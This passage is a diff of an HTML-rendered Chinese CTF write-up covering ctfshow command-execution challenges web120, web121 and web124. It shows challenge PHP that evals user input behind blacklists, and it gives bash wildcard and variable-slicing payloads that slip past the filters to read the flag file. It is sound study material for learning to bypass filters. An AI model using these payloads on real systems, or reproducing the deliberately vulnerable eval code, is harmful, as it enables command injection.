@@ -781,7 +781,7 @@ $&amp;#123;USER:~$&amp;#123;PHP_VERSION:~A&amp;#125;:$&amp;#123;PHP_VERSION:~A&a
 &lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
     &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;code&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
-    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&amp;lt;|\&gt;|\&#39;|\&#34;|\`|\||\,/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    
+    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&amp;lt;|\&gt;|\&#39;|\`|\||\,/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    
         &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;65&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
             &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;div align=&#34;center&#34;&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;you are so long , I dont like &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;/div&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
         &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
@@ -795,7 +795,75 @@ $&amp;#123;USER:~$&amp;#123;PHP_VERSION:~A&amp;#125;:$&amp;#123;PHP_VERSION:~A&a
 &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
 
 &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;相当于前两关的源码给了，加了一个长度限制，`$&lt;/p&gt;
+&lt;p&gt;相当于前两关的源码给了，加了一个长度限制&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;&amp;#96;$&amp;#123;#&amp;#125;&amp;#96; 相当于0，可省略，构造一个a&amp;#x3D;&amp;#x3D;》$&amp;#123;USER:~A&amp;#125;
+$&amp;#123;PWD::$&amp;#123;#SHLVL&amp;#125;&amp;#125;???$&amp;#123;PWD::$&amp;#123;#SHLVL&amp;#125;&amp;#125;??$&amp;#123;USER:~A&amp;#125; ????.???&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132159304.png&#34; alt=&#34;image-20221101132159304&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web121&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web121&#34;&gt;#&lt;/a&gt; web121&lt;/h2&gt;
+&lt;p&gt;过滤增加了，还有一个 PWD 能用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132608193.png&#34; alt=&#34;image-20221101132608193&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;数字还是有方法构建的&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$&amp;#123;#&amp;#125;为添加到shell的参数个数
+rev命令将文件中的每行内容以字符为单位反序输出
+$&amp;#123;#IFS&amp;#125;kali里是4，乌班图是3&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$&amp;#123;PWD::$&amp;#123;#?&amp;#125;&amp;#125;???$&amp;#123;PWD::$&amp;#123;#?&amp;#125;&amp;#125;$&amp;#123;PWD:$&amp;#123;#IFS&amp;#125;:$&amp;#123;#?&amp;#125;&amp;#125;?? ????.???&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web124&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web124&#34;&gt;#&lt;/a&gt; web124&lt;/h2&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&#34;token function&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;// 听说你很喜欢数学，不知道你是否爱它胜过爱 flag&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+    &lt;span class=&#34;token function&#34;&gt;show_source&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+    &lt;span class=&#34;token comment&#34;&gt;// 例子 c=20-1&lt;/span&gt;
+    &lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+        &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;太长了不会算&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+    &lt;span class=&#34;token variable&#34;&gt;$blacklist&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\t&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\[&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\]&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$blacklist&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$blackitem&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$blackitem&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/m&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+            &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;请不要输入奇奇怪怪的字符&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+    &lt;span class=&#34;token comment&#34;&gt;// 常用数学函数 http://www.w3school.com.cn/php/php_ref_math.asp&lt;/span&gt;
+    &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;abs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;acos&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;acosh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;asin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;asinh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;atan2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;atan&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;atanh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;base_convert&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;bindec&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ceil&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;cos&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;cosh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;decbin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;dechex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;decoct&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;deg2rad&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;exp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;expm1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;floor&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;fmod&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;getrandmax&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hexdec&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;hypot&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;is_finite&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;is_infinite&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;is_nan&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;lcg_value&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;log10&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;log1p&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;log&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;max&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;min&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;mt_getrandmax&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;mt_rand&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;mt_srand&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;octdec&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pow&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;rad2deg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;rand&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;round&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;sin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;sinh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;sqrt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;srand&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tan&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tanh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;token function&#34;&gt;preg_match_all&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$used_funcs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  
+    &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$used_funcs&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$func&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$func&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
+            &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;请不要输入奇奇怪怪的函数&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
+    &lt;span class=&#34;token comment&#34;&gt;// 帮你算出答案&lt;/span&gt;
+    &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;echo &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
